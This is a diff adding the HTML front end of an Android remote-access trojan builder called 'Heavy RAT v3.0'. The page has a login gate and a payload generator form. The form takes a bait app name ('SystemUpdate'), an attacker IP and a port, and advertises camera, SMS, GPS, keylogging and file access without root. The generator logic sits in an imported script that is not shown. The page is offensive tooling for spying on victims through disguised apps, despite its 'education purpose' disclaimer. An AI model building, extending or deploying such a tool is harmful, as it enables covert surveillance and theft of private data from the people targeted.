@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nawab Zada Hacker - Heavy RAT</title>
+    <link rel="stylesheet" href="style.css">
+    <style>
+        .heavy-mode { border: 2px solid #ff0000; box-shadow: 0 0 15px #ff0000; }
+        .toggle-switch { cursor: pointer; font-weight: bold; color: #ff4444; }
+        .feature-badge { background: #330000; color: #ff4444; padding: 2px 6px; border-radius: 4px; font-size: 0.8em; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>☠️ Heavy RAT v3.0 (No-Root Exploit)</h1>
+            <p class="brand">Developer: Nawab Zada Hacker 🦅🙌☠️</p>
+            <p class="footer-note">Software is only for education purpose. Use at your own risk.</p>
+        </header>
+
+        <div id="auth-section" class="card">
+            <h2>User Login</h2>
+            <div id="auth-status">Not Logged In</div>
+            <div id="login-form">
+                <input type="email" id="login-email" placeholder="Email">
+                <input type="password" id="login-pass" placeholder="Password">
+                <button onclick="handleLogin()">Login</button>
+                <button onclick="toggleForm('register')">Register</button>
+            </div>
+            <div id="register-form" style="display:none;">
+                <input type="email" id="reg-email" placeholder="Email">
+                <input type="password" id="reg-pass" placeholder="Password">
+                <button onclick="handleRegister()">Register</button>
+                <button onclick="toggleForm('login')">Back</button>
+            </div>
+        </div>
+
+        <!-- Dashboard Section -->
+        <div id="dashboard-section" class="card" style="display:none;">
+            <h2>🎯 Heavy Payload Generator</h2>
+            
+            <!-- Heavy Mode Toggle -->
+            <div class="toggle-container">
+                <label class="toggle-switch" id="heavy-toggle">
+                    [ACTIVE] 🧬 Heavy Exploit Mode (No-Root, Full Access)
+                </label>
+            </div>
+
+            <div class="form-group">
+                <label>App Name (Target Bait):</label>
+                <input type="text" id="apk-name" value="SystemUpdate">
+            </div>
+            <div class="form-group">
+                <label>Attacker IP (LHOST):</label>
+                <input type="text" id="lhost" placeholder="0.0.0.0" value="0.0.0.0">
+            </div>
+            <div class="form-group">
+                <label>Port (LPORT):</label>
+                <input type="number" id="lport" value="4444">
+            </div>
+            
+            <div class="feature-list-mini">
+                <span class="feature-badge">📸 Cam</span>
+                <span class="feature-badge">📞 SMS</span>
+                <span class="feature-badge">📍 GPS</span>
+                <span class="feature-badge">🔑 Keylog</span>
+                <span class="feature-badge">📂 Files</span>
+                <span class="feature-badge">🔓 No-Root</span>
+            </div>
+
+            <button class="btn-generate" id="gen-btn" onclick="generatePayload()">📦 GENERATE HEAVY APK</button>
+            
+            <div id="output-console" class="console">
+                <p>> System Ready. Waiting for generation...</p>
+            </div>
+            
+            <button onclick="logoutUser()" style="margin-top:20px;">Logout</button>
+        </div>
+    </div>
+
+    <script type="module">
+        import { loginUser, registerUser, logoutUser } from './firebase-app.js';
+        import { generateHeavyApkPayload } from './firebase-app.js';
+
+        window.handleLogin = async () => {
+            const email = document.getElementById('login-email').value;
+            const pass = document.getElementById('login-pass').value;
+            if(await loginUser(email, pass)) {
+                location.reload();
+            }
+        };
+
+        window.handleRegister = async () => {
+            const email = document.getElementById('reg-email').value;
+            const pass = document.getElementById('reg-pass').value;
+            if(await registerUser(email, pass)) {
+                alert("Registration Successful! Waiting for Admin Approval.");
+            }
+        };
+
+        window.toggleForm = (type) => {
+            if(type === 'register') {
+                document.getElementById('login-form').style.display = 'none';
+                document.getElementById('register-form').style.display = 'block';
+            } else {
+                document.getElementById('login-form').style.display = 'block';
+                document.getElementById('register-form').style.display = 'none';
+            }
+        };
+
+        window.generatePayload = () => {
+            const name = document.getElementById('apk-name').value || "SystemUpdate";
+            const lhost = document.getElementById('lhost').value;
+            const lport = document.getElementById('lport').value;
+            const isHeavy = true; // Always heavy in this version
+
+            const consoleDiv = document.getElementById('output-console');
+            consoleDiv.innerHTML = '<p>> 🔄 Compiling Heavy Payload...</p>';
+            
+            setTimeout(() => {
+                const output = generateHeavyApkPayload(lhost, lport, name, isHeavy);
+                consoleDiv.innerHTML = output.replace(/\n/g, '<br>');
+                
+                const btn = document.getElementById('gen-btn');
+                btn.innerText = "✅ APK Downloaded!";
+                btn.classList.add('heavy-mode');
+                setTimeout(() => {
+                    btn.innerText = "📦 GENERATE HEAVY APK";
+                    btn.classList.remove('heavy-mode');
+                }, 3000);
+            }, 1500);
+        };
+    </script>
+</body>
+</html>
